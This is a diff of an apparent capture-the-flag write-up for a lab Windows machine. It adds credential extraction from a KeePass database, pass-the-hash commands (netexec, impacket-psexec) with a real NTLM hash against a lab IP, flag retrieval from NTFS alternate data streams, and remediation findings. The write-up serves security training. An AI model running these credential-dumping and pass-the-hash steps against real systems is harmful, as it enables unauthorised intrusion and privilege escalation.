@@ -167,26 +167,64 @@ Credentials and NTLM hashes were extracted using `kpcli`:
 
 ```
 kpcli --kdb CEH.kdbx
+
 cd CEH/
+
 show -f 0
 show -f 1
 ...
 show -f 7
 ```
 
-This revealed multiple credentials (see Appendix). The NTLM hash associated with the local Administrator account was reused to authenticate via SMB, resulting in SYSTEM-level access.
+This revealed multiple credentials (see [Appendix](/jeeves/jeeves.md#11-appendix)). The NTLM hash associated with the local Administrator account was reused to authenticate via SMB, resulting in SYSTEM-level access.
 
 ---
 
 ## 8. Privilege Escalation
 
+Recovered NTLM hashes were tested for administrator access:
+
+```
+netexec smb 10.129.228.112 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+```
+
+Administrator access was obtained using pass-the-hash:
+
+```
+impacket-psexec administrator@10.129.228.112 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+```
+
 ---
 
 ## 9. Proof of Compromise
 
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\kohsuke\Desktop\user.txt
+```
+
+**Root Flag**: *REDACTED*
+
+The root flag was hidden using NTFS Alternate Data Streams.
+
+```
+cd C:\Users\Administrator\Desktop
+
+dir /R
+
+more < hm.txt:root.txt
+```
+
 ---
 
 ## 10. Findings & Recommendations
+
+1. **Unrestriced Jenkins Script Console allowing arbitrary code execution:** Restrict Jenkins administrative access, disable the script console where not required, and enforce role-based access control.
+2. **Sensitive credentials stored insecurely in a user-accessible KeePass database:** Store credentials securely using enterprise-grade secret management solutions and restrict access to sensitive credential files.
+3. **Reusable NTLM administrator hashes enabled pass-the-hash authentication and privilege escalation:** Disable NTLM authentication where possible, enforce Kerberos, and implement credential guard protections.
+4. **Weak SMB security configuration allowed authentication without enforced message signing:** Enforce SMB signing and harden SMB configurations to prevent relay and credential abuse attacks.
+5. **Sensitive data was hidden using NTFS Alternate Data Streams, bypassing standard file visibility:** Monitor for NTFS ADS usage, restrict unnecessary file write permissions, and include ADS checks in security audits.
 
 ---
 
@@ -202,7 +240,7 @@ This revealed multiple credentials (see Appendix). The NTLM hash associated with
 | EC-Council | hackerman123 | Password | Not used |
 | It’s a secret | admin | Password | Not used |
 | Keys to the kingdom | bob | Password | Not used |
-| Walmart[.]com | anonymous | Password | Not used |
+| Walmart.com | anonymous | Password | Not used |
 
 ### Resources Used
 
